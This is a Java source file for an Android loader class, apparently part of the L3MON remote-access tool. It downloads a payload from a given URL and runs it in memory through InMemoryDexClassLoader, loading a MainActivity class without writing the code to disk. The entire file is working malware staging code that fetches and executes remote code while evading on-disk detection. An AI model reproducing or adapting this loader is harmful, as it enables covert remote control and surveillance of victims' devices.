package com.etechd.l3mon.loader;

import android.os.Build;
import android.util.Log;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PayloadLoader {
    private static final String TAG = "L3MON_PayloadLoader";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    public static void loadPayload(String payloadUrl, OnPayloadLoaded callback) {
        executor.execute(() -> {
            try {
                // Baixar payload
                byte[] payloadData = downloadPayload(payloadUrl);
                if (payloadData == null) {
                    callback.onError("Falha no download");
                    return;
                }

                // Carregar payload
                boolean loaded = loadInMemory(payloadData);
                if (loaded) {
                    callback.onSuccess();
                } else {
                    callback.onError("Falha no carregamento");
                }

            } catch (Exception e) {
                Log.e(TAG, "Erro no carregamento", e);
                callback.onError(e.getMessage());
            }
        });
    }

    private static byte[] downloadPayload(String url) throws Exception {
        URL u = new URL(url);
        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
        conn.connect();

        if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
            InputStream is = conn.getInputStream();
            ByteArrayOutputStream os = new ByteArrayOutputStream();

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }

            return os.toByteArray();
        }
        return null;
    }

    private static boolean loadInMemory(byte[] data) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return false;
        }
        try {
            // Carregar em memória
            ByteBuffer buffer = ByteBuffer.wrap(data);
            InMemoryDexClassLoader loader = new InMemoryDexClassLoader(buffer,
                    Thread.currentThread().getContextClassLoader());

            // Carregar classes
            loader.loadClass("com.etechd.l3mon.MainActivity");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Erro ao carregar em memória", e);
            return false;
        }
    }

    public interface OnPayloadLoaded {
        void onSuccess();
        void onError(String error);
    }
}